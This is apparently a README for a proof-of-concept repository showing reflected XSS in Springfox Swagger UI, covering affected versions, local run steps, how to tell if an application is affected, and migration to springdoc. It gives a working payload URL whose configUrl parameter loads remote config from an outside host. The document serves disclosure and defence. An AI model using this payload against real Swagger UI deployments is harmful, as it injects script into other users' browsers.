# Springfox XSS PoC

## Credit and Thanks
Example application was copied from: [https://github.com/evrentan/my-swagger-ui-example](https://github.com/evrentan/my-swagger-ui-example)

All credit for code goes to: [evrentan](https://github.com/evrentan) for providing the excellent example code!

## Quick Details
**Package**: [springfox-swagger-ui](https://mvnrepository.com/artifact/io.springfox/springfox-swagger-ui)

**Versions Affected**: [2.9.1, 3.0.0]

**Type of Issue**: [Reflected XSS](https://owasp.org/www-community/attacks/xss/)

**Payload/PoC**: `?configUrl=https://xss.smarpo.com/test.json` -- Append this to end of the Swagger UI URL and an alert dialog should fire.

* eg. `https://example.com/swagger-ui/index.html?configUrl=https://xss.smarpo.com/test.json`

## Am I vulnerable?
If your application bundles the Swagger UI using one of the many Springfox packages (2.9.1 to 3.0.0 versions) AND you make the Swagger UI "routable" (aka, it can be loaded in a browser), your application has an XSS issue.

For example, if your app includes `springfox-boot-starter:3.0.0` and your Swagger UI is available at https://localhost/swagger -- you are vulnerable.

For example, if your app includes `springfox-swagger-ui:2.10.5` and your Swagger UI is available at: https://example.com/swagger/swagger-ui -- you are vulnerable.

## About
Springfox is a commonly used library for JVM-based languages to easily provide JSON documentation.
Springfox includes a vulnerable version of the Swagger UI with known XSS vulnerabilities.

The vulnerable Swagger UI bundled version is shown at: [https://github.com/springfox/springfox/blob/master/springfox-swagger-ui/build.gradle#L24](https://github.com/springfox/springfox/blob/master/springfox-swagger-ui/build.gradle#L24)

## Running the PoC

### With docker
1. Run: `docker build -t springfox-xss .`
2. Run: `docker run -p 8080:8080 springfox-xss` and wait for the springboot app to spin-up
3. Navigate to: http://localhost:8080/swagger-ui/index.html?configUrl=https://xss.smarpo.com/test.json

### Without docker
Ensure you have JDK 11 available to properly build this.

1. Run: `mvn spring-boot:run`
2. Navigate to: http://localhost:8080/swagger-ui/index.html?configUrl=https://xss.smarpo.com/test.json

XSS Payloads are hosted at: [seanmarpo/swagger-xss-payloads](https://github.com/seanmarpo/swagger-xss-payloads)

## Mitigation / Solutions

Good news, bad news. Springfox appears to no longer be maintained, however [springdoc-openapi](https://github.com/springdoc/springdoc-openapi) is a drop-in replacement that is actively being maintained.

The migration guide to springdoc from springfox can be found at: [https://springdoc.org/#migrating-from-springfox](https://springdoc.org/#migrating-from-springfox).

## Copyright

GNU General Public License v3.0
Permissions of this strong copyleft license are conditioned on making available complete source code of licensed works and modifications, which include larger works using a licensed work, under the same license. Copyright and license notices must be preserved. Contributors provide an express grant of patent rights.
